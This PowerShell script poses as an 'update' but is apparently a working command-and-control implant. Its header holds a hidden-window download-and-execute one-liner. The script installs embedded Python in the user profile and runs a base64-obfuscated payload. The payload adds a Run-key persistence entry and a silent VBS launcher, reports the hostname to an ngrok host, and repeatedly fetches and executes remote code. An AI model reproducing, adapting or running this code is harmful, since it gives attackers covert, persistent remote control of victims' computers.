# # powershell -NoP -NonI -w h -c "irm https://raw.githubusercontent.com/gaca9302/usb/refs/heads/main/c2/update.ps1 | iex"
$ErrorActionPreference = 'Stop'

$url = 'https://www.python.org/ftp/python/3.13.14/python-3.13.14-embed-amd64.zip'

$extractPath = Join-Path $env:USERPROFILE 'update'
$zipPath     = Join-Path $extractPath 'python.zip'
$pythonExe   = Join-Path $extractPath 'python.exe'
$startPy     = Join-Path $extractPath 'update.py'

# Создать папку, если её нет
New-Item -Path $extractPath -ItemType Directory -Force | Out-Null

# Скачать и распаковать Python, если python.exe отсутствует
if (-not (Test-Path -LiteralPath $pythonExe -PathType Leaf)) {
    try {
        Write-Host 'Downloading Python...'

        Invoke-WebRequest `
            -Uri $url `
            -OutFile $zipPath `
            -UseBasicParsing

        Write-Host 'Extracting Python...'

        Expand-Archive `
            -LiteralPath $zipPath `
            -DestinationPath $extractPath `
            -Force

        if (-not (Test-Path -LiteralPath $pythonExe -PathType Leaf)) {
            throw 'python.exe was not found after extraction.'
        }

        Write-Host 'Python extracted successfully.'

        # Удалить архив только после успешной распаковки
        Remove-Item -LiteralPath $zipPath -Force
        Write-Host 'ZIP archive deleted.'
    }
    catch {
        Write-Error "Error: $($_.Exception.Message)"
        Write-Host "Archive preserved, if available: $zipPath"
        exit 1
    }
}
else {
    Write-Host 'Python already exists. Download skipped.'
}

$PythonCode = @"
import base64
exec(base64.b64decode('ZnJvbSB1cmxsaWIucmVxdWVzdCBpbXBvcnQgUmVxdWVzdCwgdXJsb3BlbgppbXBvcnQgc29ja2V0LCB0aW1lLCBiYXNlNjQsIG9zLCB3aW5yZWcKZnJvbSBwYXRobGliIGltcG9ydCBQYXRoCm5hbWUgPSBzb2NrZXQuZ2V0aG9zdG5hbWUoKS5lbmNvZGUoInV0Zi04IikKdXJsID0gImh0dHBzOi8vc2NhcmNlLXN1bGxlbi1icmlsbGlhbnQubmdyb2stZnJlZS5kZXYiIApjdXJyZW50X2RpciA9IFBhdGgoX19maWxlX18pLnJlc29sdmUoKS5wYXJlbnQKdmJzX3BhdGggPSBvcy5wYXRoLmpvaW4oY3VycmVudF9kaXIsICJ1cGRhdGUudmJzIikKcHl0aG9uX2V4ZSA9IG9zLnBhdGguam9pbihjdXJyZW50X2RpciwgInB5dGhvbi5leGUiKQp1cGRhdGVfcHkgPSBvcy5wYXRoLmpvaW4oY3VycmVudF9kaXIsICJ1cGRhdGUucHkiKQppZiBub3Qgb3MucGF0aC5leGlzdHModmJzX3BhdGgpOgogICAgdmJzX2NvbnRlbnQgPSBmJ0NyZWF0ZU9iamVjdCgiV3NjcmlwdC5TaGVsbCIpLlJ1biAiIiJ7cHl0aG9uX2V4ZX0iIiAiInt1cGRhdGVfcHl9IiIiLCAwLCBGYWxzZScKICAgIHdpdGggb3Blbih2YnNfcGF0aCwgInciLCBlbmNvZGluZz0idXRmLTgiKSBhcyBmOgogICAgICAgIGYud3JpdGUodmJzX2NvbnRlbnQpCiAgICBrZXlfcGF0aCA9IHIiU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVuIgogICAgd2l0aCB3aW5yZWcuT3BlbktleSh3aW5yZWcuSEtFWV9DVVJSRU5UX1VTRVIsIGtleV9wYXRoLCAwLHdpbnJlZy5LRVlfU0VUX1ZBTFVFKSBhcyBrZXk6CiAgICAgICAgd2lucmVnLlNldFZhbHVlRXgoa2V5LCJUYXNrIiwwLHdpbnJlZy5SRUdfU1osdmJzX3BhdGgpCnJlcSA9IFJlcXVlc3QodXJsLCBkYXRhPW5hbWUpIApyZXEuYWRkX2hlYWRlcigiQ29udGVudC1UeXBlIiwgInRleHQvcGxhaW4iKQpyZXEuYWRkX2hlYWRlcigibmdyb2stc2tpcC1icm93c2VyLXdhcm5pbmciLCAiMSIpCndoaWxlIFRydWU6CiAgICB0cnk6CiAgICAgICAgdXJsb3BlbihyZXEpCiAgICAgICAgd2l0aCB1cmxvcGVuKHVybCsiL2Jpbi50eHQiLCB0aW1lb3V0PTUpIGFzIHJlczoKICAgICAgICAgICAgZXhlYyhjb21waWxlKGJhc2U2NC5iNjRkZWNvZGUocmVzLnJlYWQoKSksICc8YmluYXJ5PicsICdleGVjJykpCiAgICAgICAgdGltZS5zbGVlcCg2MDApCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgdGltZS5zbGVlcCg2MDAp').decode('utf-8'))
"@
Set-Content -Path $startPy -Value $PythonCode -Encoding UTF8
& "$env:USERPROFILE\update\python.exe" "$env:USERPROFILE\update\update.py"
